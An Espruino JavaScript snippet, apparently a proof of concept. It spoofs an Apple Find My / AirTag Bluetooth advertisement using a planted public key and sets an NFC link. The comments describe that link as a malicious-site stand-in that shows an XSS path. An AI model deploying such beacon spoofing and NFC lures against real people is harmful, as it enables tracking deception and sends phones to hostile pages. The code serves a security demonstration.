NRF.setAddress("c7:2c:30:f6:88:c1 random");  // Bytes 0-5 of public key
NRF.setAdvertising(NRF.getAdvertisingData([0x1e,  // Length of Advertisement
  0xff,  // Manufacturer data
  0x4c, 0x00, // Apple ID
  0x12, 0x19,  // OF type and length
  0x10,  // Status
  0xb2, 0xa5, 0x78, 0x79, 0xbe, 0xcf, 0x90, 0x19, 0xd8, 0xc8, 0x6d, 
  0x26, 0xc0, 0x47, 0xec, 0x34, 0x0b, 0xf0, 0x76, 0x81, 0xd7, 0x97, // // Bytes 5-27 of public key
  0x03, // Bits 0-1 of byte 0
  0xC1], {interval:2000})); // Hint Byte (byte 5 of key)

NRF.nfcURL("https://heeeeeeeey.com/"); // Link to malicous site (Not malicious in our case, just a javascript re-direct to demonstrate viability of XSS)


//Debugging
// Flash green LED if successful
digitalWrite(LED2, true);
setTimeout(function(){ 
  digitalWrite(LED2, false);
}, 3000);  


// Blink green for 100ms
function blinkGreen() {
  LED2.write(true);
  setTimeout(function () { LED2.write(false); }, 100);
}

// Detect button press and blink green
setWatch(blinkGreen, BTN, { edge: "rising", repeat: true, debounce: 50 });
